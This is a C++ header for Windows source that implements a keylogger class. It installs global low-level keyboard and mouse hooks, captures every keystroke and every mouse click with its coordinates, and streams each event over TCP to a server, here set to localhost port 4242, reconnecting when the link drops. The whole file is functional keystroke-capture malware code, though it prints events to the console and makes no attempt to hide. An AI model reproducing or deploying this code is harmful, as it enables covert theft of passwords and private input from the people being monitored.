#ifndef _KEYLOGER_HPP_
#define _KEYLOGER_HPP_

#include <map>
#include <string>
#include <bitset>
#include <iostream>
#include <windowsx.h>
#include "Protocol.hpp"
#include "TCPClient.hpp"

///////////////////////////////////////////////////////////////////////////////////
//                       Callback WinAPI declaraction                            //
///////////////////////////////////////////////////////////////////////////////////

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam);

///////////////////////////////////////////////////////////////////////////////////
//                  Compact single instance class in stack                       //
///////////////////////////////////////////////////////////////////////////////////

class KeyLogger
{
private:
	TCPClient* m_client = nullptr;

public:
	virtual void onKeyboardEvent(int code, WPARAM wParam, LPARAM lParam) {
		KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		std::string key;
		t_proto data;

		if (m_keycode2name.find(kbdStruct.vkCode) != m_keycode2name.end())
			key = m_keycode2name.at(kbdStruct.vkCode);
		else
			key = "Unknown key";

		if (wParam == WM_KEYDOWN)
		{
			std::cout << key << " is pressed" << std::endl;
			data.source = eventSource::KEYBOARD;
			data.button_code = kbdStruct.vkCode;
			data.key_status = m_keycodeStatus::DOWN;
			data.x_pos = 0;
			data.y_pos = 0;
			m_client->sendData(&data, sizeof(data));
		}
		else if (wParam == WM_KEYUP)
		{
			std::cout << key << " is released" << std::endl;
			data.source = eventSource::KEYBOARD;
			data.button_code = kbdStruct.vkCode;
			data.key_status = m_keycodeStatus::UP;
			data.x_pos = 0;
			data.y_pos = 0;
			m_client->sendData(&data, sizeof(data));
		}
		else {
			std::cout << key << " has an unknown status" << std::endl;
			data.source = eventSource::KEYBOARD;
			data.button_code = kbdStruct.vkCode;
			data.key_status = m_keycodeStatus::UNDEFINED;
			data.x_pos = 0;
			data.y_pos = 0;
			m_client->sendData(&data, sizeof(data));
		}
	};

	virtual void onMouseEvent(int code, WPARAM wParam, LPARAM lParam) {
		POINT pt = reinterpret_cast<MSLLHOOKSTRUCT*>(lParam)->pt;
		t_proto data;

		std::string mouse_button;
		if (m_mousecode2name.find(wParam) != m_mousecode2name.end()) {
			mouse_button = m_mousecode2name.at(wParam);
		}
		else {
			mouse_button = "unknown button";
		}
		std::cout << "Mouse " << mouse_button << " at: " << pt.x << " " << pt.y << std::endl;
		data.source = eventSource::MOUSE;
		data.button_code = wParam;
		data.key_status = m_keycodeStatus::UNDEFINED;
		data.x_pos = pt.x;
		data.y_pos = pt.y;
		m_client->sendData(&data, sizeof(data));
	};

	void checkServer()
	{
		if (!m_client->isConnected()) {
			std::cout << "Trying to reconnect..." << std::endl;
			m_client->connectToHost("127.0.0.1", "4242");
		}
	}

	BOOL refreshNonBlocking() {
		PeekMessage(&m_msg, 0, NULL, 0, 0);
		//DispatchMessage(&m_msg);
		return TRUE;
	}

	BOOL refreshBlocking() {
		return GetMessage(&m_msg, 0, NULL, 0);
	}

	static KeyLogger& getInstance()
	{
		static KeyLogger singleton;
		return singleton;
	}

	void KeyLogger::setTCPClient(TCPClient *client)
	{
		m_client = client;
	}


	HHOOK m_hook;
	HHOOK m_hook_mouse;

private:
	MSG m_msg;

	KeyLogger() {
		m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); //Enable keyboard hook
		m_hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0); //Enable mouse hook
	};

	~KeyLogger() {
		UnhookWindowsHookEx(m_hook);
		UnhookWindowsHookEx(m_hook_mouse);
	};

	KeyLogger(const KeyLogger&);                 // SingleTon Cannot be copied copy-construction
	KeyLogger& operator=(const KeyLogger&) {      // SingleTon Cannot be assigned

	};
};

#endif /* !_KEYLOGER_HPP_ */